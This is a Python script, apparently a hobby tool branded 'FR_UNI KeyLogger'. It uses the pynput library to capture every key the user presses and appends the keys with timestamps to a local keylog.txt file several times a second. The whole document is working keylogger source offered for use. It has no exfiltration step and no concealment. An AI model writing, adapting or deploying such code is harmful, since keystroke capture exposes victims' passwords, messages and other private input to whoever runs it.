import os
from pynput import keyboard
from datetime import datetime
import time
import pyfiglet
from colorama import Fore

text = pyfiglet.figlet_format("FR_UNI KeyLogger")
print(Fore.BLUE + text)

                                              
# This is a simple keylogger that logs the keys pressed by the user and stores them in a file named "keylog.txt" in FR_KeyLogger directory.

keys_pressed = []

def keyPressed(key):
    global keys_pressed
    print(str(key))
    try:
        char = key.char
        keys_pressed.append(char)
    except AttributeError:
        key_str = str(key).replace("Key.", "")
        keys_pressed.append(f"{{{key_str}}}")

def write_log():
    global keys_pressed
    if keys_pressed:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("scripts/FR_KeyLogger/keylog.txt", 'a') as logKey:
            logKey.write(f"{timestamp} - {''.join(keys_pressed)}\n")
        keys_pressed = []

def cleanup():
    with open("scripts/FR_KeyLogger/keylog.txt", 'a') as logKey:
        logKey.write("\n\n")

# Store the key pressed in a file named "keylog.txt" in FR_KeyLog directory.
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    try:
        while True:
            write_log()
            time.sleep(0.1)  # Write log every 0.1 seconds
    except KeyboardInterrupt:
        cleanup()
        listener.stop()